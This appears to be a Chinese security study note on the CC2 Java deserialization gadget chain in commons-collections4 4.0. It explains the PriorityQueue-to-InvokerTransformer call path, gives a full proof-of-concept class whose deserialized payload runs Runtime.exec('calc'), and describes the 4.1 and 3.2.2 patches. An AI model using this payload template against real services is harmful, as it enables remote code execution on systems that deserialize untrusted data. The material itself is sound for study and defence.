# 0x01 Preface

CC链提出时官方有两个`Commons Collections`版本

* commons-collections:commons-collections
* org.apache.commons:commons-collections4

两者的命名空间不冲突，可以共存在同⼀个项⽬中。

```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.0</version>
</dependency>
```

之前的利用链`CC1、CC3、CC6`在`commons-collections4`均能正常使用，不过方法名可能稍有变动。

CC链实际上就是一条`Serializable#readObject()`到`Transformer#transform()`的调用链

# 0x02 PriorityQueue

CC2中用到的两个类：

* `java.util.PriorityQueue`
* `org.apache.commons.collections4.comparators.TransformingComparator`

```java
public class PriorityQueue<E> extends AbstractQueue<E>
    implements java.io.Serializable {
    private int size = 0;

    private void readObject(java.io.ObjectInputStream s){
            s.defaultReadObject();
            s.readInt();
            queue = new Object[size];
            for (int i = 0; i < size; i++)
                queue[i] = s.readObject();
            heapify();
    }
    private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
}
```

```java
// TransformingComparator#compare
public int compare(final I obj1, final I obj2) {
    final O value1 = this.transformer.transform(obj1);
    final O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

`PriorityQueue#readObject()` => `heapify()` => `siftDown()` => `siftDownUsingComparator() `=> `comparator.compare()` => `transformer.transform()`

* `heapify`
  `int i = (size >>> 1) - 1`得非负
* `siftDownUsingComparator`
  `half = size >>> 1`得大于上面的i

`PriorityQueue`构造函数不会给size赋初值，需要用反射去赋值

# 0x03 Weave POC

```java
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2 {
    public static void setFieldValue(Object obj, String fieldName, Object newValue) throws Exception {
        Class clazz = obj.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, newValue);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer(
                        "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator comparator = new TransformingComparator(chainedTransformer);
        PriorityQueue pq = new PriorityQueue(comparator);
        setFieldValue(pq, "size", 4);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(pq);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

# 0x04 Patch

`org.apache.commons.collections4.comparators.TransformingComparator`
在commons-collections4.0以前是版本没有实现 Serializable接口

官方发布的新版本4.1和3.2.2用于修复CC链
3.2.2中 增加了⼀个⽅法`FunctorUtils#checkUnsafeSerialization`
⽤于检测反序列化是否安全，其会检查常⻅的危险Transformer类，当我们反序列化包含这些对象时就会抛出异常。
若开发者没有设置全局配置 `org.apache.commons.collections.enableUnsafeSerialization=true`
即默认情况下会抛出异常

4.1中 这几个危险的Transformer类不再实现 Serializable 接口，直接不能序列化和反序列化

因此CC2只能在commons-collections4.0上跑通。